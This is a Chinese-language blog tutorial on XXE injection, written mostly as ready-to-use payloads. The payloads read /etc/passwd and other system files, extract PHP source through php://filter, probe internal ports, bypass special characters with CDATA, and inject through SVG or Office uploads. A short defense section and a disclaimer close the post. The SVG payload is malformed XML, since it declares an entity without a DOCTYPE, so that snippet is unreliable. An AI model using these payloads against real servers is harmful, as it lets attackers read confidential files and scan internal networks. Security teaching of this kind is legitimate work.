---
title: XXE 基础注入与文件读取
date: 2025-12-15 08:00:00
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
description: XXE（XML External Entity）从入门到文件读取——XML/DTD/ENTITY 声明基础、file:// 读文件、php://filter 读源码、CDATA 绕过特殊字符、SVG/Office/PDF 中的 XXE。
---

## XML 基础

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe "test">       <!-- 内部实体 -->
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- 外部实体 → 读文件 -->
]>
<root>
  <data>&xxe;</data>         <!-- 引用实体 → 此处回显文件内容 -->
</root>
```

---

## 有回显 XXE

```xml
<!-- 经典 payload：读 /etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

**PHP 环境下读源码：**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<user><name>&xxe;</name></user>
<!-- 返回 base64 编码的源码，解码即可 -->
```

---

## 探测内网端口

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080">
]>
<!-- 超时 = 端口关闭，响应/不同错误 = 端口开放 -->
```

---

## CDATA 绕过

被读文件含 `<` `>` 等特殊字符时 XML 解析报错，用 CDATA 包裹：

```xml
<!DOCTYPE foo [
  <!ENTITY start "<![CDATA[">
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
  <!ENTITY end "]]>">
]>
<root>&start;&xxe;&end;</root>
```

或者用 `php://filter` 直接 base64 编码，绕过字符问题。

---

## 非标准 XML 场景

### SVG 中的 XXE

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
  <text>&xxe;</text>
</svg>
```

上传为头像的 SVG → 服务器解析 → 文件内容被渲染到图片中。

### Office 文档中的 XXE

.docx / .xlsx 本质是 ZIP 包含 XML。解压 → 修改 `document.xml` 插入 XXE payload → 重新打包 → 上传。

---

## 防御

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

PHP: `libxml_disable_entity_loader(true);`

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
